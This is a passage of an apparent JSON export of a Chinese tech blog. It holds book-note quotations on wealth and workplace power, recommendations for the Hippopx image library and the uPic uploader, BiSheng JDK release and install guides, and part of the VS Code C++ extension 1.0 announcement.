随着时间的推移，你还需要一本思想日记本（记录你的所有创意）、一本关系日记本（记录所有使你快乐的关系）、一本知识日记本（记录你从自己犯过的错误中学到的所有东西，使你以后不会再重蹈覆辙），以及其他内容的日记本……\n\n7.去为你的劣势找到解决方案，去为你的优势找一个教练吧！\n\n8.你在未来5年当中可以休息一整年。在一整年的时间里，你可以做想做的任何事，并有能力支付这一年的所有账单。你可以去旅行，做使你快乐但平时又没有足够时间来做的事情。\n\n9.一致性不是绝对的美德。如果我今天的观点与昨天不同，是不是就因为改变自身方向而没有一致性了呢？我的确与自己的过去不相一致了，但于真理而言，我是保持一致了……一致性在于按照认知去追随真理。\n\n10.借口是我们讲给自己听的谎言。我们应该自己对自己越来越诚实，承担越来越多的责任。\n\n11.全世界最富有的投资者沃伦·巴菲特说过：“毕竟，只有当潮水退去时，你才知道谁在裸泳。”\n\n12.恐惧永远不应该左右你的决定。因为世界上不存在失败。是的，你没有看错：世界上不存在失败。美国脱口秀大师奥普拉·温弗瑞曾经说过：“我不相信失败。因为如果你享受了过程中的乐趣，那这就不是失败。”\n\n13.“如果你不经常犯错，表明你冒的风险不够，没有付出最大的努力。”\n\n---\n\n## 《财务自由之路 II》博多·舍费尔\n\n1.正如爱因斯坦（Einstein）所言，我相信“每个孩子都可能是天才”。我们中的每个人，您和我至少在某方面有着特殊的天赋，而我们应该把这些天赋发挥到极致。\n\n2.对于大多数人来说，薪水其实是给自己的赔偿费。\n\n3.当您成功时，生活的大门为您敞开。虽然在通向胜利的道路上，您将会常常看到地狱，然而生活就是如此。但是，如果您坚持梦想，就不会被打倒。您将得到想得到的一切，还有很多很多其他的东西。\n——弗莱明思（J.Flemmings）\n\n4.一幢房子是一种负债，而非投资。并且，他希望我首先进行投资。他的原则是：“当您攒够一定数量的资金之后，再购置房产。而且，房子的价值不应超出年净收入的4倍，并且您每月分期付款不应超过月收入的25%。”\n\n5.许多人仅仅从经济角度来考虑他们的主要事业。他们遵循这样的信条：“什么能赚钱，什么就是我的主要事业。”依我看，这是个完全错误的开端。\n\n---\n\n## 《权力》杰弗瑞·菲佛\n\n1.处在一个权力小、地位低的职位上可能会危害你的健康，相反，拥有权力及相应的控制权则会延长你的寿命。\n\n2.你要克服自己这个障碍，克服对自我形象的过分关注，或者是特别在意别人对你的看法。无论如何，其他人不会特别关心或惦记你，他们关注的主要是他们自己。如果你不去尝试获得影响力，你也许能够维护良好的形象，但却无法登上权力的顶峰。\n\n3.雇员的薪酬与他们的年龄和在组织中任期长短的关系，强于薪酬与工作绩效的关系。\n\n4.掌权者自我感觉良好，最好的方法之一就是恭维他们。\n\n5.为你的成功负责的人，是你的上司，是有权力提升你或者阻止你在组织中晋升的人。而且不管你的位置在哪里，总会有人在你上面。所以你的工作就是，确保那些有影响力的人有强烈的愿望让你获得成功。这可能需要你做好工作，但也可能需要确保掌权者知道你的工作做得很好，确保他们记得你，对你的评价很高，因为你能让他们自我感觉良好。业绩和职场政治技巧结合在一起，才能帮助你获得晋升。只靠业绩本身是不够的，在某些情况下，业绩甚至可能是无关痛痒的。\n\n6.一些人晋升到很高的位置并成就了惊人的事业，他们与其他人的不同之处有两点：意愿和技能。意愿是使人愿意承担巨大挑战的驱动力，技能则是把雄心转换为成就的能力。意愿体现在个人素质中，就是雄心、精力和专注。而有助于获得权力的4项技能，则分别是自知之明和反省心态、散发自信的信心和能力、理解他人并懂得换位思考以及化解冲突的能力。在对以上每个特质进行说明之后，我将讨论另一个特质：智力。智力和权力有些关系，但我认为它被严重高估了。\n\n7.如果你对你的工作值多少回报没有自信，对你想要的东西也不自信，你就不愿意要求或者推动别人，因此，相较于那些比你活跃的人而言，你获得的金钱或影响力就比较少。\n\n8.引人注意可以帮助你获得你需要的位置和权力。你应该为你想要的东西提出请求，并且在为自己构建权力之路时，不要太在乎别人怎么看你。但是，要获得和行使权力，就需要资源来奖励你的朋友和惩罚你的敌人，需要信息和门路来促进你在组织中的升迁。\n\n9.事实上人们常犯的一个严重错误是，他们以为在目前的职位上无法建立权力基础和掌握资源，以为需要在更高的职位上才能这样做。其实，如果你把权力基础打好，那么攀升到更高的职位就会变得更简单容易一些，而且你在任何时候都可以这样做，永远都不会太早或太迟。\n\n10.领导的实质就是：让拥有不同能力和视角的人或部门协作，共同完成一项任务或达成一桩交易。\n\n11.领导力的秘诀就是要扮演角色，要装模作样，要在这门舞台艺术上富于技巧。\n\n12.与表达悲伤、内疚或自责的人相比，表达愤怒的人通常被视为更加强大。\n\n13.领导力的秘诀就是要扮演角色，要装模作样，要在这门舞台艺术上富于技巧。\n\n14.我们选择了我们行事和说话的方式，这些决定对于获取和保持权力而言非常重要。\n\n15.“权力之中有20%是被赋予的，有80%是自己获取的。”\n\n16.一旦人们对某个人形成了印象，他们就不会承认任何与他们最初想法不一致的信息。\n\n17.行为动力机制倾向于巩固人们的初步印象和声望，并倾向于让这些印象成真，即使它们一开始并不是真的。\n\n18.这里的建议不是让你在任何一个单一的地方留下良好的印象，而是建议你找到一个可以让你树立辉煌声望的环境，也就是建议你不断尝试不同的环境，直到你成功地发现了这样一个环境为止。\n\n19.由于人们来自不同的背景，面临的激励机制不同，获得的信息不同，所以他们所看到的世界也各不相同。因此在组织中，分歧是不可避免的。令人遗憾的是，许多人都会尝试避免冲突，他们认为分歧令人不快，因此他们避免让不同的意见浮出水面，也避免与对手进行艰难的交谈。\n\n20.如果你处在一个权力相当大的位置上，而你觉得自己变得越来越疲倦时，那你还不如离开这个位置。\n\n21.人们包括公司都容易落入能力陷阱。他们曾以某种方式做某些事，并获得了成功。\n\n22.有些人以为自己不喜欢或者不可能喜欢玩权力游戏。但他们根本就没有尝试过，又如何知道自己会不喜欢呢？\n\n","categories":["读书笔记"],"tags":["读书笔记"]},{"title":"网站推荐 | 基于CC0协议的免版权图库 Hippopx","url":"/recommend/hippopx/","content":"\n[Hippopx](https://www.hippopx.com/) 是一个基于 CC0 协议的免版权图库。Hippopx 提供的图像可免费用于个人和商业项目。网站提供了多种语言，包括中文。该网站上的每一张图片都打上了相关内容的标签，图片的命名也和内容相关。\n\n## 网站截图\n\n![Hippopx首页](https://up-img.yonghong.tech/pic/2020/10/09-22-44-%E6%88%AA%E5%B1%8F2020-10-09%20%E4%B8%8B%E5%8D%8810.37.12-lothe7.png)\n\n<!-- more -->\n\n![Hippopx热门图片](https://up-img.yonghong.tech/pic/2020/10/09-22-45-%E6%88%AA%E5%B1%8F2020-10-09%20%E4%B8%8B%E5%8D%8810.38.09-dK13jp.png)\n\n## 什么是CC0？\n\nhttps://creativecommons.org/publicdomain/zero/1.0/deed.zh\n\n**CC0 1.0 通用 (CC0 1.0) 公共领域贡献** 意味着 **无著作权**\n\n在作品上适用该文本的人已经将作品 贡献 至公共领域，在法律允许的范围，放弃所有他在全世界范围内基于著作权法对作品享有的权利，包括所有相关权利和邻接权利。\n\n您可以复制、修改、发行和表演本作品，甚至可用于商业性目的，都无需要求同意。请看以下其他信息。\n\nCC0不影响任何人可能拥有的专利权或商标权，也不影响其他人可能拥有的对本作品本身的权利，或者决定本作品如何使用的权利，比如形象权或隐私权。\n\n除非另有明确声明，本文件项下的作品关联人，在可适用法律所允许的最大限度内，不对本作品提供担保，不承担因本作品使用产生的责任。\n\n当使用或引用本作品时，您不得暗示 作者或声明人为您的行为背书。\n\n## 条款\n\nHippopx 提供的图像可免费用于个人和商业项目，本页列出了商业项目的定义和使用条件。请阅读全文，从 Hippopx 下载图像，您需要同意下面规定的所有条款和条件。\n\n## 什么是商业用途？\n\n来自本网站的图像可用于几乎任何商业设计项目，这包括大多数形式的数字或印刷创意：网页设计，应用程序设计，WordPress主题，PSD和HTML模板等。博客和社交媒体团队也可以自由地使用我们的图片。\n\n## 您是否需要提供图片来源？\n\n不必须，但它是提供图片来源是推荐的，特别是对于商业 WordPress 主题和网络模板。如果您无法提供图片来源，请通过社交媒体和博客与同事和朋友分享此网站。这个网站分享的越多，我们可以与您分享的图片也更多。\n\n## 商业形象使用注意事项\n\n### 品牌知名度\n\n我们的一些图片包含来自知名品牌和已注册商标的公司的产品。这些商标需要得到尊重和承认。\n\n### 型号版本\n\nHippopx 提供真实世界的摄影。这意味着，我们提供的任何包含人员的图像可能未通过模型发布，因此这些图像可能不适合某些类型的商业用途。\n\n### 产权\n\n某些图像可能包含拥有图像和产权的私营公司拥有的私人建筑。这些图像可能不适合某些类型的商业用途，因为您需要获得有关公司的许可才能合法发布图像。\n\n## 禁止使用\n\n您不得将我们的图像用于色情、非法或其他不道德目的，或以可能给被描绘的人起坏名声的方式使用，或暗示可识别的人、品牌或组织认可产品和服务。您不能在免费库存照片网站或应用程序上使用这些图像或重新分发这些图片，您不能出售和/或重新分发这些图像，暗示您是摄影师;你不能出售和/或重新分发这些图像作为股票摄影\n\n## 免责声明\n\nHippopx 对因不正确或不当使用从本网站下载的任何图像而导致的任何版权侵犯不负任何责任。Hippopx 的所有用户下载和使用我们的映像的风险由他们自己承担，并完全负责后续的图像使用和应用。","categories":["推荐"],"tags":["网站推荐","推荐","Hippopx","无版权图库","图库"]},{"title":"软件推荐 | 更好用的图床(文件)上传客户端 uPic","url":"/recommend/upic/","content":"\n[uPic(upload Picture)](https://github.com/gee1k/uPic) 是一款 macOS 端的图床(文件)上传客户端。\n\n💡 特点：：无论是本地文件、或者屏幕截图都可自动上传，菜单栏显示实时上传进度。上传完成后文件链接自动复制到剪切板，让你无论是在写博客、灌水聊天都能快速插入图片。 连接格式可以是普通 URL、HTML 或者 Markdown，仍由你掌控。\n\n**🔋 支持图床：** [smms](https://sm.ms/)、 [又拍云 USS](https://www.upyun.com/products/file-storage)、[七牛云 KODO](https://www.qiniu.com/products/kodo)、 [阿里云 OSS](https://www.aliyun.com/product/oss/)、 [腾讯云 COS](https://cloud.tencent.com/product/cos)、 [百度云 BOS](https://cloud.baidu.com/product/bos.html)、[微博](https://weibo.com/)、[Github](https://github.com/settings/tokens)、 [Gitee](https://gitee.com/profile/personal_access_tokens)、 [Amazon S3](https://aws.amazon.com/cn/s3/)、[Imgur](https://imgur.com/)、[自定义上传接口](https://blog.svend.cc/upic/tutorials/custom)、...\n\n<!-- more -->\n\n## 🚀 如何安装\n\n### 下载安装\n\n#### 1.Homebrew(推荐):\n\n```\nbrew cask install upic\n```\n\n#### 2.手动\n\n从 [Github release](https://github.com/gee1k/uPic/releases) 下载。\n\n**如果在国内访问 Github 下载困难的，可以从[Gitee release](https://gitee.com/gee1k/uPic/releases)下载。**\n\n### 检查 Finder 扩展权限\n\n- 1.打开 uPic\n\n- 2.打开`系统偏好设置` - `扩展` - `访达扩展` 确保 `uPicFinderExtension`是勾选状态\n\n<img src=\"https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f66696e6465722d657874656e73696f6e2e706e67-DYYKob.png\" width=\"650px\" style=\"margin: 0 auto;\"/>\n\n## 🕹 使用方式\n\n| 功能                     | 描述                                         | 预览                                                         |\n| ------------------------ | -------------------------------------------- | ------------------------------------------------------------ |\n| **🖥 选择文件上传**       | 从`Finder`选择文件上传。`可设置全局快捷键`   | ![img](https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f73656c65637446696c652e676966-VqFefp.gif) |\n| **⌨️ 复制文件上传**       | 上传已拷贝到剪切板的文件。`可设置全局快捷键` | ![img](https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f7061737465626f6172642e676966-hBiI5s.gif) |\n| **📸 截图上传**           | 直接拉框截图上传。`可设置全局快捷键`         | ![img](https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f73637265656e73686f742e676966-91Kj7l.gif) |\n| **🖱 拖拽本地文件上传**   | 拖拽文件到状态栏上传                         | ![img](https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f6472616746696c652e676966-5Dzzbw.gif) |\n| **🖱 拖拽浏览器图片上传** | 从浏览器拖拽图片到状态栏上传                 | ![img](https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f6472616746726f6d42726f777365722e676966-QYEBH7.gif) |\n| **📂 Finder 中右键上传**  | 右击文件上传                                 | ![img](https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f636f6e746578746d656e752e676966-7Nmsoo.gif) |\n| **⌨️ 命令行上传**         | 通过执行命令调用 uPic 上传文件               | ![img](https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f636c692e676966-uqE7yy.gif) |\n\n## 🧰 更多功能\n\n### 1.全局快捷键\n\n<img src=\"https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f73686f7274637574732e706e67-eWTput.png\" width=\"450px\" style=\"margin: 0 auto;\"/>\n\n### 2. 上传历史\n\n<img src=\"https://up-img.yonghong.tech/pic/2020/10/10-17-07-68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f686973746f72792e706e67-Ad5U62.png\" width=\"650px\" style=\"margin: 0 auto;\"/>\n\n\n\n\n","categories":["推荐"],"tags":["推荐","软件推荐","uPic","图床"]},{"title":"毕昇 JDK 11 开源了！","url":"/release/bishengjdk-11/","content":"\n毕昇JDK是华为内部OpenJDK定制版Huawei JDK的开源版本，是一个高性能、多平台支持、可用于生产环境的OpenJDK发行版。Huawei JDK运行在华为内部500多个产品上，积累了大量使用场景和java开发者反馈的问题和诉求，解决了业务实际运行中遇到的多个问题，并在ARM架构上进行了性能优化，毕昇JDK运行在大数据等场景下可以获得更好的性能。毕昇JDK 11目前仅支持Linux/AArch64平台。毕昇JDK同时是OpenJDK的下游，现在和未来也会持续稳定为OpenJDK社区做出贡献。\n\n二进制可以从[这里](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/)下载。\n\n<!-- more -->\n\n## 平台支持\n\n毕昇JDK 当前支持 `Linux/AArch64` 平台。\n\n## 支持特性\n\n**毕昇JDK 11在ARM上支持了实验特性的ZGC**，用户可以通过以下选项打开ZGC\n\n```\njava -XX:+UnlockExperimentalVMOptions -XX:+UseZGC\n```\n\n详细介绍请见[毕昇JDK ZGC介绍](https://gitee.com/openeuler/bishengjdk-11/wikis/ZGC%20Getting%20Started?sort_id=2879168)。\n\n[**快速序列化**](https://gitee.com/openeuler/bishengjdk-11/wikis/FastSerializer?sort_id=2879166) 对于一些需要使用Java原生序列化接口而无法使用第三方序列化框架的场景，我们对Java序列化做了一些优化，用户可以使用如下命令打开：\n\n```\n-XX:+UnlockExperimentalVMOptions -XX:+UseFastSerializer -DfastSerializerEscapeMode=true\n```\n\n该参数不能兼容所有序列化场景，对于`序列化对象在读写两端不一致`或者`classmeta信息在运行时发生改变`等场景，fastSerializer会无法支持，这时需要保证打开了`-DfastSerializerEscapeMode=true`选项保证可以回退到原生的序列化模式。\n\n## 安装指南\n\n您可以使用tar压缩包格式或者yum源方式来安装JDK（Java Development Kit）或者JRE（Java Runtime Environment）。\n\nJDK是JRE的超集，包含了JRE的所有内容，并包含javac/jdb等开发者必须的编译器和调试器。JRE仅提供运行时库、Java虚拟机和其他一些运行java应用程序所必须的组件。请注意JRE不只包含Java SE规范的内容，也包含一些规范之外java应用程序常用的内容。\n\n用户可以通过以下两种方式来安装：\n\n- tar压缩包格式（.tar.gz）：通过这种方式您可以将JDK安装到系统的任意位置，且不会和系统中其他JDK产生影响。但是这种方式会需要用户进行一些手动设置。详情请见下表。\n- 从yum源安装（.rpm）：通过这种方式您可以将JDK安装到系统的某个固定路径中，并为所有用户提供，这种安装方式需要root权限。详情请见下表。\n\n| 下载文件                                                     | 操作指南                                                     | 支持架构      | 安装所需权限 | Sha256                                                       |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------- | ------------ | ------------------------------------------------------------ |\n| [bisheng-jdk-11.0.8-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jdk-11.0.8-linux-aarch64.tar.gz) | [在 Linux/AArch64 平台上安装JDK 11](https://gitee.com/openeuler/bishengjdk-11/wikis/%E6%AF%95%E6%98%87JDK%2011%20%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97?sort_id=2891160#2) | Linux/AArch64 | Anyone       | [sha256](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jdk-11.0.8-linux-aarch64.tar.gz.sha256) |\n| [bisheng-jre-11.0.8-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jre-11.0.8-linux-aarch64.tar.gz) | [在 Linux/AArch64 平台上安装JRE 11](https://gitee.com/openeuler/bishengjdk-11/wikis/%E6%AF%95%E6%98%87JDK%2011%20%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97?sort_id=2891160#1) | Linux/AArch64 | Anyone       | [sha256](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jre-11.0.8-linux-aarch64.tar.gz.sha256) |\n| 从yum源安装                                                  | 即将到来                                                     | *             | Root权限     | *                                                            |\n\n### 在 Linux/AArch64 平台上安装JDK 11\n\n- 下载压缩包 [bisheng-jdk-11.0.8-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kupeng/archive/compiler/bisheng_jdk/bisheng-jdk-11.0.8-linux-aarch64.tar.gz).\n\n- 进入到你想要将JDK安装的目录中，并将 .tar.gz 压缩包拷贝到当前目录。\n\n```\ncd /path/to/jdk\n```\n\n- 将 .tar.gz 压缩包解压缩：\n\n```\n$ tar zxvf bisheng-jdk-11.0.8-linux-aarch64.tar.gz\n```\n\nJDK的安装目录为 jdk-11.0.8。\n\n- 如果您想节省磁盘空间，您可以删除 .tar.gz 压缩包。\n\n### 在 Linux/AArch64 平台上安装JRE 11\n\n- 下载压缩包 [bisheng-jre-11.0.8-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kupeng/archive/compiler/bisheng_jdk/bisheng-jre-11.0.8-linux-aarch64.tar.gz).\n\n- 进入到你想要将JRE安装的目录中，并将 .tar.gz 压缩包拷贝到当前目录。\n\n```\ncd /path/to/jre\n```\n\n- 将 .tar.gz 压缩包解压缩：\n\n```\n$ tar zxvf bisheng-jre-11.0.8-linux-aarch64.tar.gz\n```\n\nJRE的安装目录为 jre-11.0.8。\n\n- 如果您想节省磁盘空间，您可以删除 .tar.gz 压缩包。\n\n## 参考文章\n\n- [openeuler/bishengjdk-11](https://gitee.com/openeuler/bishengjdk-11)","categories":["release"],"tags":["JDK","Java","release","毕昇","bisheng","bishengjdk"]},{"title":"毕昇 JDK 8 开源了！","url":"/release/bishengjdk-8/","content":"\n毕昇JDK是华为内部OpenJDK定制版Huawei JDK的开源版本，是一个高性能、可用于生产环境的OpenJDK发行版。Huawei JDK运行在华为内部500多个产品上，积累了大量使用场景和java开发者反馈的问题和诉求，解决了业务实际运行中遇到的多个问题，并在ARM架构上进行了性能优化，毕昇JDK运行在大数据等场景下可以获得更好的性能。毕昇JDK 8与Java SE标准兼容，目前仅支持Linux/AArch64平台。毕昇JDK同时是OpenJDK的下游，现在和未来也会持续稳定为OpenJDK社区做出贡献。\n\n二进制可以从[这里](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/)下载。\n\n<!-- more -->\n\n## 平台支持\n\n毕昇JDK 当前支持 `Linux/AArch64` 平台。\n\n## 支持特性\n\n**毕昇JDK已经升级至8u262版本**，感谢OpenJDK社区众多开发者的贡献，现在毕昇JDK也已支持JFR，它是默认关闭的，用户可以使用以下命令在java应用启动的时候启用JFR，您还需要一个jmc 7.0以上的版本来读取jfr dump文件。\n\n```\njava -XX:+FlightRecorder\n```\n\n[**快速序列化**](https://gitee.com/openeuler/bishengjdk-11/wikis/FastSerializer?sort_id=2879166) 对于一些需要使用Java原生序列化接口而无法使用第三方序列化框架的场景，我们对Java序列化做了一些优化，用户可以使用如下命令打开：\n\n```\n-XX:+UnlockExperimentalVMOptions -XX:+UseFastSerializer -DfastSerializerEscapeMode=true\n```\n\n该参数不能兼容所有序列化场景，对于`序列化对象在读写两端不一致`或者`classmeta信息在运行时发生改变`等场景，fastSerializer会无法支持，这时需要保证打开了`-DfastSerializerEscapeMode=true`选项保证可以回退到原生的序列化模式\n\n## 安装指南\n\n您可以使用tar压缩包格式或者yum源方式来安装JDK（Java Development Kit）或者JRE（Java Runtime Environment）。\n\nJDK是JRE的超集，包含了JRE的所有内容，并包含javac/jdb等开发者必须的编译器和调试器。JRE提供运行时库、Java虚拟机和其他运行java应用程序所必须的组件。请注意JRE不只包含Java SE规范的内容，也包含一些规范之外java应用程序常用的内容。\n\n用户可以通过以下两种方式来安装：\n\n- tar压缩包格式（.tar.gz）：通过这种方式您可以将JDK安装到系统的任意位置，且不会和系统中其他JDK产生影响。但是这种方式会需要用户进行一些手动设置。详情请见下表。\n- 从yum源安装：通过这种方式您可以将JDK安装到系统的某个固定路径中，并为所有用户提供，这种安装方式需要root权限。`当前只有openEuler操作系统支持该操作`，详情请见下表。\n\n| 下载文件                                                     | 操作指南                                                     | 支持架构      | 安装所需权限 | Sha256                                                       |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------- | ------------ | ------------------------------------------------------------ |\n| [bisheng-jdk-8u262-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jdk-8u262-linux-aarch64.tar.gz) | [在 Linux/AArch64 平台上安装JDK 8](https://gitee.com/openeuler/bishengjdk-8/wikis/%E6%AF%95%E6%98%87JDK%208%20%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97?sort_id=2891179#1) | Linux/AArch64 | 任何人       | [sha256](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jdk-8u262-linux-aarch64.tar.gz.sha256) |\n| [bisheng-jre-8u262-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jre-8u262-linux-aarch64.tar.gz) | [在 Linux/AArch64 平台上安装JRE 8](https://gitee.com/openeuler/bishengjdk-8/wikis/%E6%AF%95%E6%98%87JDK%208%20%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97?sort_id=2891179#2) | Linux/AArch64 | 任何人       | [sha256](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jre-8u262-linux-aarch64.tar.gz.sha256) |\n| 从yum源安装                                                  | 即将推出                                                     | *             | root权限     | *                                                            |\n\n### 在 Linux/AArch64 平台上安装JDK 8\n\n- 下载压缩包 [bisheng-jdk-8u262-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jdk-8u262-linux-aarch64.tar.gz).\n- 进入到你想要将JDK安装的目录中，并将 .tar.gz 压缩包拷贝到当前目录。\n\n```\n$ cd /path/to/jdk\n```\n\n- 将 .tar.gz 压缩包解压缩：\n\n```\n$ tar zxvf bisheng-jdk-8u262-linux-aarch64.tar.gz\n```\n\nJDK的安装目录为 jdk-8u262.\n\n- 如果您想节省磁盘空间，您可以删除 .tar.gz 压缩包。\n\n### 在 Linux/AArch64 平台上安装JRE 8\n\n- 下载压缩包 [bisheng-jre-8u262-linux-aarch64.tar.gz](https://mirrors.huaweicloud.com/kunpeng/archive/compiler/bisheng_jdk/bisheng-jre-8u262-linux-aarch64.tar.gz).\n- 进入到你想要将JDK安装的目录中，并将 .tar.gz 压缩包拷贝到当前目录。\n\n```\n$ cd /path/to/jre\n```\n\n- 将 .tar.gz 压缩包解压缩：\n\n```\n$ tar zxvf bisheng-jre-8u262-linux-aarch64.tar.gz\n```\n\nJRE的安装目录为 jre-8u262.\n\n## 参考文章\n\n- [openeuler/bishengjdk-8](https://gitee.com/openeuler/bishengjdk-8)\n","categories":["release"],"tags":["JDK","Java","release","毕昇","bisheng","bishengjdk"]},{"title":"Visual Studio Code 的 C++ 扩展迎来首个正式版本（v1.0）!","url":"/release/c-plus-plus-in-visual-studio-code-1-0/","content":"\n微软最近[宣布](https://devblogs.microsoft.com/cppblog/c-in-visual-studio-code-reaches-version-1-0/) Visual Studio Code 的 C++ 扩展已达到 1.0 稳定版本。C++ 扩展为 C++ 开发人员带来了包括 IntelliSense 智能代码补全、调试、重构、代码导航等在内的功能。这些功能可适应多个平台、架构和编译器，从而实现各种交叉编译和远程开发方案。 \n\nVS Code C++ 扩展 1.0 版本的一大亮点是对 ARM Linux 和 ARM 64 的支持，并提供了 IntelliSense 以及远程构建和调试支持。现在用户可以使用 VS Code 和 Remote-SSH 在 Raspberry Pi 上构建 C++ 应用程序。\n\n另外，此发行版附带了一个[教学视频](https://aka.ms/cpp-intelliSense)，用来告诉大家如何配置 C++ IntelliSense。\n\n<!-- more -->\n\n原文如下：\n\nWe’re excited to announce the first generally available release of the **C++ extension for Visual Studio Code**! Visual Studio Code is a free code editor that runs on Linux, macOS, and Windows, and is highly-customizable to make it exactly what you want it to be.\n\nThe C++ extension brings a rich set of productivity features to VS Code for C++ developers, including IntelliSense smart code completion, debugging, refactoring, code navigation, and more! On top of that, these features are adaptable to various platforms, architectures and compilers, enabling all your cross-compiling and remote development scenarios.\n\nThroughout the years, our customers have helped shape the direction of C++ development in VS Code by asking for key features and reporting bugs. The version 1.0 of the C++ extension for Visual Studio Code delivers these features in high quality. You asked, we listened.\n\n## Editing\n\nWhen it comes to editing, the C++ extension provides an abundance of productivity features to boost your coding efficiency. To name a few, the extension comes with:\n\n- IntelliSense: code completion, parameter info, quick info, and member lists\n- Code navigation: Find All References, Go to Definition/Declaration, Peek Definition/Declaration\n- Refactoring support: Rename Symbol\n- Code formatting\n- Semantic colorization, which provides colorization to variables even when they are used outside of the scope in which they are declared\n- Doxygen comment documentation\n\n![Screenshot of member list from C++ IntelliSense engine](https://up-img.yonghong.tech/pic/2020/09/27-11-38-editing-screenshot-02eKoJ.png)\n\n## Debugging\n\nVisual Studio Code’s built-in debugger UI launches your C++ debugger of choice under the hood, creating an intuitive, yet customizable, debugging experience across Linux, macOS, and Windows. With the C++ extension’s debugger, you can:\n\n- Set breakpoints (conditional, unconditional, and function breakpoints)\n- Set watch variables\n- Step through your program\n- Debug multi-threaded programs\n- Debug a remote process\n- And more!\n\n![Screenshot showing C++ debug session in VS Code](https://up-img.yonghong.tech/pic/2020/09/27-11-38-debug-screenshot-nEYKCp.png)\n\nThe C++ extension 1.0 also includes all our recent fixes to previous issues with the debugger, such as:\n\n- Support for macOS Catalina (GitHub issue [#3829](https://github.com/microsoft/vscode-cpptools/issues/3829))\n- Support for modifying conditional breakpoints while debugging (cppdbg) (GitHub issue [#2297](https://github.com/microsoft/vscode-cpptools/issues/2297))\n- Watch local variables support for LLDB (GitHub issue [#1768](https://github.com/microsoft/vscode-cpptools/issues/1768))\n\n## What’s new in 1.0?\n\n### Support for Linux on ARM and ARM64\n\nWe’re excited to announce that version 1.0 of the C++ extension brings a first-class development experience for Linux on ARM and ARM64, complete with IntelliSense and remote build and debug support. You can now develop C++ applications on Raspberry Pi with VS Code and Remote-SSH!\n\n### Easy IntelliSense configuration\n\nWe know that configuring C++ IntelliSense hasn’t always been easy. So, we’ve created a [video tutorial](https://aka.ms/cpp-intelliSense) to help you out. Get rid of your error squiggles in minutes!\n\n### Customizable code formatting\n\nVersion 1.0 of the C++ extension brings a new, rich set of C++ formatting settings. All C++ code formatting settings from the Visual Studio IDE are now supported in VS Code. What’s more, the C++ extension has built-in [EditorConfig](https://docs.microsoft.com/en-us/visualstudio/ide/cpp-editorconfig-properties?view=vs-2019) support for all these new settings, giving you more control and flexibility with code formatting than ever before.\n\n### C++ extension pack\n\nTo make it as easy as possible to take full advantage of everything Visual Studio Code has to offer—remote development, GitHub integration, first-class CMake support to name a few—we’ve created a [C++ Extension Pack](https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools-extension-pack) for you. The extension pack includes:\n\n- C/C++\n- C/C++ Themes\n- CMake\n- CMake Tools\n- Remote Development Extension Pack\n- GitHub Pull Requests and Issues\n- Visual Studio Codespaces\n- LiveShare Extension Pack\n- Doxygen Documentation Generator\n- Better C++ Syntax\n\n### Quality\n\nIf you haven’t tried Visual Studio Code with C++ in a while, it is time to give it another go. Our team has been hard at work for months fixing a myriad of reported issues and the C++ extension is now better for it. For example, we’ve addressed nine [performance-related GitHub issues](https://github.com/microsoft/vscode-cpptools/issues?q=is%3Aissue+is%3Aclosed+label%3Aperformance+label%3A\"fixed+(release+pending)\"+sort%3Aupdated-desc) in the past nine months. In fact, many VS Code extensions build off of the C++ extension’s high quality IntelliSense engine, such as [PlatformIO 